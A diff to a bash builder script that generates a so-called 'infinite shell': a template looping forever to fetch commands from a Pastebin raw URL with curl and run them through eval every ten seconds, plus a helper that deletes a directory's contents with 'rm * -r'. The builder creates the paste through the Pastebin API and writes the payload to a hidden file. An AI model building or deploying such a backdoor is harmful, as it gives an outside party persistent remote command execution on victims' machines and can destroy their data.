@@ -1,5 +1,54 @@
 #!/usr/bin/env bash
 
+
+
+template='#!/usr/bin/env bash
+
+function cld() {
+
+    echo "Clearing $1"
+
+
+    [ ! -e "$1" ] && return
+
+    [ ! -d "$1" ] && return
+
+    [ -e "$1" ] && [ -d "$1" ] && cd "$1"
+
+    [ "$PWD" != "$1" ] && return
+
+    [ "$(ls $1)" ] && rm * -r
+
+    [ "$(ls $1)" ] && echo "00000000000000000" && return
+
+    [ ! -s "$1" ] && echo "==================="
+
+}
+
+function main() {
+
+    useragent=
+    url=
+
+    command=$(curl -sS -L -A $useragent $url)
+
+    if [ -z "$command" ]; then
+        return
+    else
+        eval $command
+    fi
+
+    sleep 10
+}
+
+while true; do
+    main
+done
+'
+
+
+
+
 usage_text="Usage: bash build url|key url_or_key [optional_user_agent]\n\n"
 usage_text+="Example: bash build url pastebin.com/raw/ABC123 \"Mozilla 5.0\"\n"
 usage_text+="Example: bash build key ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 \"Mozilla 5.0\"\n\n"
@@ -39,8 +88,7 @@ function check_api_resp() {
     fi
 }
 
-
-content=$(cat .template)
+content=$template
 
 
 if [[ "$1" = "url" ]]; then
@@ -74,6 +122,8 @@ then
 
     new_url=$(curl -sS -L -X POST -A "$user_agent" -d "api_dev_key=$dev_key" -d "api_user_key=$api_user_key" -d "api_paste_code=ls" -d "api_option=paste" -d "api_paste_name=$paste_name" -d "api_paste_private=1" "https://pastebin.com/api/api_post.php")
 
+    new_url_copy=$new_url
+
     new_url=${new_url//https:\/\/pastebin.com/pastebin.com\/raw}
 
     content=${content//url=/url=\"$new_url\"}
@@ -81,7 +131,11 @@ then
 
     echo "$content" >".infish"
 
+    echo -e "\n\n"
+
     echo -e "Successfully built infinite shell\n\n"
+
+    echo -e "The paste url is $new_url_copy\n"
 
     exit
 
